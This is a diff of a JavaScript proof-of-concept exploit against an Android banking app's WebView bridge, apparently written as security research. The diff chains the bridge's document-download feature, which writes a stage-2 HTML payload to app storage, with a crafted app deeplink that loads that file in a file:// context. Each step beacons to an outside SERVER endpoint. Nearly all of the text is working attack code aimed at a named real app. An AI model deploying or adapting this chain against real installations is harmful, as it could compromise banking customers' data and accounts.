@@ -22,33 +22,34 @@ function log(step) {
     new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
 }
 
-// Step 1: Confirm the page loaded at all
 log("1-page-loaded");
 
-// Step 2: Check if the JS bridge exists
 if (typeof WebViewFragment === "undefined") {
     log("FAIL-no-bridge");
 } else {
     log("2-bridge-exists");
 
-    // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
-    try {
-        var testHtml = '<html><body><script>' +
-            'try {' +
-            '  WebViewFragment.onNavigateWebHook(JSON.stringify({' +
-            '    "version": "1.2",' +
-            '    "type": "externalWebview",' +
-            '    "destination": "' + SERVER + '/log?step=5-file-context-alive"' +
-            '  }));' +
-            '} catch(e) {' +
-            '  document.title = "bridge-error: " + e;' +
-            '}' +
-            '<\\/script></body></html>';
+    // --- Stage 2 payload (will run in file:// context) ---
+    var stage2Html = '<html><body><h1 id="s">Checking...</h1><script>'
+        + 'var hasBridge = (typeof WebViewFragment !== "undefined");'
+        + 'document.getElementById("s").innerText = "JS ran. Bridge=" + hasBridge;'
+        + 'if (hasBridge) {'
+        + '  WebViewFragment.onNavigateWebHook(JSON.stringify({'
+        + '    "version": "1.2",'
+        + '    "type": "externalWebview",'
+        + '    "destination": "' + SERVER + '/log?step=5-file-context-alive-bridge-works"'
+        + '  }));'
+        + '} else {'
+        + '  document.title = "FAIL-no-bridge-in-file-context";'
+        + '}'
+        + '<\\/script></body></html>';
 
+    // --- Step 3: Write stage 2 to disk via DYNAMIC_DOWNLOAD_DOCUMENT ---
+    try {
         WebViewFragment.onFeatureEventWebHook(JSON.stringify({
             "version": "1.2",
             "type": "dynamicDownloadDocument",
-            "targetFileBase64": btoa(testHtml),
+            "targetFileBase64": btoa(stage2Html),
             "fileName": "verify.html"
         }));
         log("3-download-called");
@@ -56,13 +57,25 @@ if (typeof WebViewFragment === "undefined") {
         log("FAIL-download-error-" + e.message);
     }
 
-    // Step 4: Navigate to file after short delay
+    // --- Step 4: Use EXTERNAL_WEBVIEW to fire a deeplink back into the app ---
+    // This creates an Android Intent (not a Chromium navigation), which
+    // routes back to SplashActivity -> JointAccountSecondaryDeepLinkHandler
+    // -> webView.loadUrl("file://...") — an app-initiated load.
     setTimeout(function() {
-        log("4-about-to-navigate");
+        log("4-firing-self-chain-deeplink");
         setTimeout(function() {
-            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
+            try {
+                WebViewFragment.onNavigateWebHook(JSON.stringify({
+                    "version": "1.2",
+                    "type": "externalWebview",
+                    "destination": "rbcbanking://?target=joint_account_secondary&target_url=file%3A%2F%2F%2Fstorage%2Femulated%2F0%2FAndroid%2Fdata%2Fcom.rbc.mobile.android%2Ffiles%2Fverify.html&invitation_id=test"
+                }));
+                // Can't beacon after this — EXTERNAL_WEBVIEW may have navigated us away
+            } catch(e) {
+                log("FAIL-navigate-error-" + e.message);
+            }
         }, 500);
-    }, 1500);
+    }, 2000);
 }
 </script>
 </body>
